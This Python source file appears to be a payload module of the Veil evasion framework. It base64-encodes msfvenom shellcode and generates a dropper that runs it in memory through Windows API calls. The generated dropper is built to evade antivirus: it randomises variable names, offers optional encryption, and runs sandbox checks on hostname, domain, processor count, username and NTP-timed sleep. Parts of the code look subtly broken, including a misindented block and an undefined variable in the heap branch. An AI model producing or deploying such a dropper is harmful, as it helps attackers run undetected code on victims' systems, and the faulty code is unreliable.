"""

This payload receives the msfvenom shellcode, base64 encodes it, and stores it within the payload.
At runtime, the executable decodes the shellcode and executes it in memory.


module by @christruncer

"""

import base64

from datetime import date
from datetime import timedelta

from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import encryption
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "Base64 encoded shellcode is decoded at runtime and executed in memory"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"
        self.name = "Python Base64 Encoded"
        self.path = "python/shellcode_inject/base64_substitution"
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def generate(self):

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode
        Shellcode = Shellcode.encode('latin-1')
        Shellcode = Shellcode.decode('unicode_escape')
        # Base64 Encode Shellcode
        EncodedShellcode = base64.b64encode(bytes(Shellcode, 'latin-1')).decode('ascii')

        # Generate Random Variable Names
        ShellcodeVariableName = evasion_helpers.randomString()
        RandPtr = evasion_helpers.randomString()
        RandHt = evasion_helpers.randomString()
        randctypes = evasion_helpers.randomString()

        num_tabs_required = 0
        payload_code = ''

        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = evasion_helpers.randomString()
            RandExpire = evasion_helpers.randomString()

            todaysdate = date.today()
            expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

            # Create Payload code
            payload_code += '\t' * num_tabs_required + 'from datetime import datetime\n'
            payload_code += '\t' * num_tabs_required + 'from datetime import date\n'
            payload_code += '\t' * num_tabs_required + RandToday + ' = datetime.now()\n'
            payload_code += '\t' * num_tabs_required + RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
            payload_code += '\t' * num_tabs_required + 'if ' + RandToday + ' < ' + RandExpire + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["HOSTNAME"][0].lower() != "x":

            rand_hostname = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import platform\n'
            payload_code += '\t' * num_tabs_required + rand_hostname + ' = platform.node()\n'
            payload_code += '\t' * num_tabs_required + 'if \"' + self.required_options["HOSTNAME"][0].lower() + '\" in ' + rand_hostname + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["DOMAIN"][0].lower() != "x":

            rand_domain = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import socket\n'
            payload_code += '\t' * num_tabs_required + rand_domain + ' = socket.getfqdn()\n'
            payload_code += '\t' * num_tabs_required + 'if \"' + self.required_options["DOMAIN"][0].lower() + '\" in ' + rand_domain + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["PROCESSORS"][0].lower() != "x":

            rand_processor_count = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import multiprocessing\n'
            payload_code += '\t' * num_tabs_required + rand_processor_count + ' = multiprocessing.cpu_count()\n'
            payload_code += '\t' * num_tabs_required + 'if ' + rand_processor_count + ' >= ' + self.required_options["PROCESSORS"][0] + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import getpass\n'
            payload_code += '\t' * num_tabs_required + rand_user_name + ' = getpass.getuser()\n'
            payload_code += '\t' * num_tabs_required + 'if \'' + self.required_options["USERNAME"][0].lower() + '\' in ' + rand_user_name + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

       if self.required_options["SLEEP"][0].lower() != "x":

            rand_time_name = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'from time import sleep\n'
            payload_code += '\t' * num_tabs_required + 'from socket import AF_INET, SOCK_DGRAM\n'
            payload_code += '\t' * num_tabs_required + 'import sys\n'
            payload_code += '\t' * num_tabs_required + 'import datetime\n'
            payload_code += '\t' * num_tabs_required + 'import time\n'
            payload_code += '\t' * num_tabs_required + 'import socket\n'
            payload_code += '\t' * num_tabs_required + 'import struct\n'
            payload_code += '\t' * num_tabs_required + 'client = socket.socket(AF_INET, SOCK_DGRAM)\n'
            payload_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
            payload_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
            payload_code += '\t' * num_tabs_required + rand_time_name + ' = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)\n'
            payload_code += '\t' * num_tabs_required + 'sleep(' + self.required_options["SLEEP"][0] + ')\n'
            payload_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
            payload_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
            payload_code += '\t' * num_tabs_required + 'if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - ' + rand_time_name + ').seconds >= ' + self.required_options["SLEEP"][0] + '):\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += '\t' * num_tabs_required + 'import ctypes as ' + randctypes + '\n'
            payload_code += '\t' * num_tabs_required + 'import base64\n'
            payload_code += '\t' * num_tabs_required + ShellcodeVariableName +' = base64.b64decode(\"' + EncodedShellcode + '\")\n'
            payload_code += '\t' * num_tabs_required + RandPtr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len('+ ShellcodeVariableName +')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x40))\n'
            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
            payload_code += '\t' * num_tabs_required + RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\n'

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            HeapVar = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import ctypes as ' + randctypes + '\n'
            payload_code += '\t' * num_tabs_required + 'import base64\n'
            payload_code += '\t' * num_tabs_required + ShellcodeVariableName +' = base64.b64decode(\"' + EncodedShellcode + '\")\n'
            payload_code += '\t' * num_tabs_required + HeapVar + ' = ' + randctypes + '.windll.kernel32.HeapCreate(' + randctypes + '.c_int(0x00040000),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ') * 2),' + randctypes + '.c_int(0))\n'
            payload_code += '\t' * num_tabs_required + RandPtr + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + ShellcodeVariableName + ')))\n'
            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + RandBuf + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
            payload_code += '\t' * num_tabs_required + RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\n'

        if self.required_options["USE_PYHERION"][0].lower() == "y":
            payload_code = encryption.pyherion(payload_code)

        self.payload_source_code = payload_code
        return
